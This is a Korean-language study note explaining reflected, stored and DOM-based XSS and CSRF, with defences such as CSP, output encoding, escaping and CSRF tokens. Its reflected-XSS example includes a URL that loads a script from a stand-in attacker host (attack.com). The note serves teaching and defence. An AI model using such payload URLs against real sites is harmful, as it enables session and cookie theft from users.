# XSS & CSRF

## XSS (Cross-Site-Scripting)
- 사용자를 대상으로 한 공격이다.
- JS를 통해서 의도치않은 동작을 실행시키게 한다.
- 게시판, 웹 메일등에서 발생 할 수 있다.
- Cookie와 같은 사용자의 개인정보를 탈취하기 위해서 사용된다.
  - HTTP-Only-Cookie
  - Secure-Cookie

### 1. Reflected XSS
- **공격자가 제공한 입력값이 서버로 전송 된후, 서버의 처리 이후 클라이언트에게 그대로 반환되며 발생한다.**
- 주로 URL 파라미터를 통한 GET 요청 (with QueryString)을 통해서 발생한다.
- 브라우저 자체에서 차단하는 경우가 많다.
- 사용자에게 악성 스크립트가 포함된 URL을 클릭하게하여, 악성 스크립트를 실행시킨다.
  - Reflect라는 말 그대로 사용자의 입력값 혹은 QueryString(악성스크립트)이 그대로 리턴되고 브라우저에서 실행되서 발생한다.

#### 예시
```html
<!-- 1. 사용자에게 악성스크립트가 포함된 URL을 전송한다.-->
https://trustSite.com?search=<script src="http://attack.com/atack.js"/>

<!-- 2. 서버는 클라이언트의 Input을 검증없이 그대로 리턴하며, 클라이언트는 그대로 브라우저에 렌더링한다. -->
<div class="search__keyword">
  검색어: {response.keyword}
</div>

<!-- 3. 브라우저에 렌더링 된 악성코드는 그대로 실행된다. -->
```

#### 해결책
1. CSP(Content-Security-Policy)
   - 허용된 Resouce만 로드 할 수 있도록 제한한다.
2. 출력값 인코딩
    - Client로 리턴되는 데이터를 인코딩 한다.

### 2. Stored XSS
- 가장 위험한 XSS 공격이다.
- 서버상에 악성 스크립트가 저장된 형태이다.
- SQL Injection 같이, 평문이 아닌 스크립트를 서버에서 검증없이 받을 때 발생한다.
- 서버 (DB)에 저장된 악성스크립트가 그대로 사용자에게 전해지고, 실행되게 된다.
- HTML5에서는 Inner HTML에서의 Scrit실행을 막아두었다.
  - 완벽한 해결책은 아니다.
  - innerHTML 외에, 다른 방식으로의 스크립트 삽입이 가능하다.
  - 이전 버전의 브라우저들은 지원하지 않을 수 있다.

#### 예시
```html
<!--div태그 안의 Text는  -->
<div class="post__description">
  안녕하세요! 오늘의 날씨는 정말 좋네요. 
  <script>/* 악성 코드 */</script> 
  좋은 하루 보내세요!
</div>
```

#### 해결책
1. 입력값 검증 및 정제
   - 필터링, 화이트 리스트 등을 통한 정제
2. 출력값 이스케이핑
   - '<'와 '>'를 각각 '\&lt;'와 '\&gt;'로 변경한다.
3. innerHTML이 아닌 다른 것들 사용 (순전하게 Text로 인식하는 것들)
   - appendChild
   - textContent

### 3. DOM-Based XSS (Dom 기반 XSS
- DOM을 조작하여 악성 스크립트를 실행시키는 방식이다.
- Client단 JavaScript 코드가 취약점을 갖고있는 경우 발생한다.
- **사용자의 입력을 처리하는 과정에서 DOM을 조작하여 악성 스크립트를 실행한다.**
- **Reflected XSS와 같지만 (Client에서 공격자의 input이 그대로 렌더링) Server를 거치지 않는다는 점에서 다르다.**

#### 해결책
1. CSP(Content-Security-Policy)
    - 허용된 Resouce만 로드 할 수 있도록 제한한다.
2. 출력값 인코딩
    - Client로 리턴되는 데이터를 인코딩 한다.
   
***

## CSRF (Cross-Site-Request-Forgery)
- 탈취가 목적이 아닌, 비정상적인 동작을 하게 하는 것이 목적이다.
- 사용자가 인증된 상태에서 의도하지 않은채로, 해커의 의도한 행위를 하게되는 것이다.
  - 의도치 않게 서버를 공격한다.
- 서버가 사용자를 신뢰하기 때문에 발생한다.
  - 로그인되어 있는 상태로 서버에 비정상적인 명령을 내리기 때문이다.

### 조건
1. 로그인이 되어있어야 한다.
2. 해커가 제공한 사이트에 접속해야한다.

### 방지책
- Referrer를 통한 도메인 일치 검증 
  - Referrer를 보내지 안흔 사용자에게는 이방법을 사용할 수 없다. (요즘엔 거의 없다.)
- CSRF Token 사용
  - 요청, 세션 마다 Token을 서버에서 발급한다.
  - 이전 응답시점에 발급했던 CSRF토큰과, 현재 Cleint의 요청에 동봉된 CSRF의 일치 여부를 확인한다.
  - 잠재적인 CSRF 위협을 방지한다.